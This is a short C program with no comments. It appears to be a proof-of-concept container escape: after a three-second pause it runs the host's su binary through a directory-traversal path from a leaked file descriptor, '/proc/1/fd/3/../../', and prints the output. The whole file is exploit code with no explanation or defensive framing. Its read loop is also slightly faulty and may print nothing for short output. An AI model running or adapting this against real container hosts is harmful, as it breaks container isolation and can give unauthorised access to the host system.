#include <stdio.h>
#include <unistd.h>

int main() {

    sleep(3);

    size_t bytesRead = 0;

    FILE *run = popen("/proc/1/fd/3/../../../../../../../usr/bin/su", "r");
    char buf[1000] = {0};

    while ((bytesRead = fread(buf, sizeof(buf), 1, run)) > 0) {
        printf("%s", buf);
    }

    pclose(run);
}
